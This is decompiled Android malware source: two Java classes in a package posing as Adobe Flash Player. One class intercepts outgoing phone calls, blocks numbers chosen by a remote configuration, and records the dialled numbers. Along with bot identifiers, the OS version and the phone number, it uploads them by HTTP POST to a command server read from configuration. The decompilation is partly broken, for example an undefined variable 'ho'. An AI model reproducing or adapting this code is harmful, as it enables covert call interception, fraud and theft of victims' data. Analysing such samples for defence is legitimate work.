package com.adobe.flashplayer_;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build.VERSION;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class FlashZ extends BroadcastReceiver {
    public MediaRecorder recorder = null;

    public void onReceive(Context context, Intent intent) {
        boolean sa = false;
        if (intent.getExtras() != null) {
            NetworkInfo netInfo;
            String IMEI;
            String cvadi = readConfig("c", context);
            String BotID = readConfig("BotID", context);
            String BotNetwork = readConfig("BotNetwork", context);
            String BotLocation = readConfig("BotLocation", context);
            String URL = readConfig("Reich_ServerGate", context);
            String BotVer = readConfig("BotVer", context);
            String SDK = VERSION.RELEASE;
            if (cvadi.indexOf("*") != -1 && null == null) {
                sa = true;
                if (getResultData() != null) {
                    sa = true;
                    netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
                    IMEI = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
                    if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                        saveData("" + intent.getStringExtra("android.intent.extra.PHONE_NUMBER"), new StringBuilder(String.valueOf(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").replace("+", "").replace("*", "S").replace("#", "W"))).append(".txt").toString(), context);
                        new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=blocked_call&i=" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(".txt").toString()).toString(), URL});
                    }
                    setResultData(null);
                }
            }
            if (cvadi.indexOf(",") != -1 && !sa) {
                String[] f = cvadi.split(",");
                for (String indexOf : f) {
                    if (intent.getStringExtra("android.intent.extra.PHONE_NUMBER").indexOf(indexOf) != -1) {
                        sa = true;
                        if (getResultData() != null) {
                            netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
                            IMEI = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
                            if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                                saveData("" + intent.getStringExtra("android.intent.extra.PHONE_NUMBER"), new StringBuilder(String.valueOf(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").replace("+", "").replace("*", "S").replace("#", "W"))).append(".txt").toString(), context);
                                new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=blocked_call&i=" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(".txt").toString()).toString(), URL});
                            }
                            setResultData(null);
                        }
                    }
                }
            } else if (!(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").indexOf(cvadi) == -1 || cvadi == "" || sa || getResultData() == null)) {
                sa = true;
                netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
                if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                    saveData("" + intent.getStringExtra("android.intent.extra.PHONE_NUMBER") + "\n", new StringBuilder(String.valueOf(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").replace("+", "").replace("*", "S").replace("#", "W"))).append(".txt").toString(), context);
                    new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=blocked_call&i=" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(".txt").toString()).toString(), URL});
                }
                setResultData(null);
            }
            netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
            IMEI = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
            if (netInfo != null && netInfo.isConnectedOrConnecting() && !sa) {
                saveData("" + intent.getStringExtra("android.intent.extra.PHONE_NUMBER"), new StringBuilder(String.valueOf(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").replace("+", "").replace("*", "S").replace("#", "W"))).append(".txt").toString(), context);
                new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=out_call&i=" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(".txt").toString()).toString(), URL});
            }
        }
    }

    private void saveData(String data, String f, Context context) {
        try {
            OutputStreamWriter osw = new OutputStreamWriter(context.openFileOutput(f, 0));
            osw.write(data);
            osw.close();
        } catch (IOException e) {
        }
    }

    private String readConfig(String config, Context context) {
        String ret = "";
        try {
            InputStream inputStream = context.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }

    private void writeConfig(String config, String data, Context context) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }
}
package com.adobe.flashplayer_;

import android.os.AsyncTask;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class FlashVirtual extends AsyncTask<String, String, String> {
    /* access modifiers changed from: protected|varargs */
    public String doInBackground(String... params) {
        DataInputStream dataInputStream;
        HttpURLConnection conn = null;
        String exsistingFileName = params[1];
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        String urlString = params[2] + "?a=3" + params[0];
        try {
            FileInputStream fileInputStream = new FileInputStream(new File(exsistingFileName));
            conn = (HttpURLConnection) new URL(urlString).openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
            DataOutputStream dataOutputStream;
            try {
                dos.writeBytes(new StringBuilder(String.valueOf(twoHyphens)).append(boundary).append(lineEnd).toString());
                dos.writeBytes("Content-Disposition: form-data; name='TEMP'; filename='" + exsistingFileName + "'" + lineEnd);
                dos.writeBytes(lineEnd);
                int bufferSize = Math.min(fileInputStream.available(), AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                byte[] buffer = new byte[bufferSize];
                int bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                while (bytesRead > 0) {
                    dos.write(buffer, 0, bufferSize);
                    bufferSize = Math.min(fileInputStream.available(), AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }
                dos.writeBytes(lineEnd);
                dos.writeBytes(new StringBuilder(String.valueOf(twoHyphens)).append(boundary).append(twoHyphens).append(lineEnd).toString());
                fileInputStream.close();
                dos.flush();
                dos.close();
                dataOutputStream = dos;
            } catch (MalformedURLException e) {
                dataOutputStream = dos;
            } catch (IOException e2) {
                dataOutputStream = dos;
            }
        } catch (IOException | MalformedURLException e3) {
        }
        try {
            DataInputStream inStream = new DataInputStream(conn.getInputStream());
            do {
                try {
                } catch (IOException e4) {
                    dataInputStream = inStream;
                }
            } while (inStream.readLine() != null);
            inStream.close();
            dataInputStream = inStream;
        } catch (IOException e5) {
        }
        return null;
    }
}
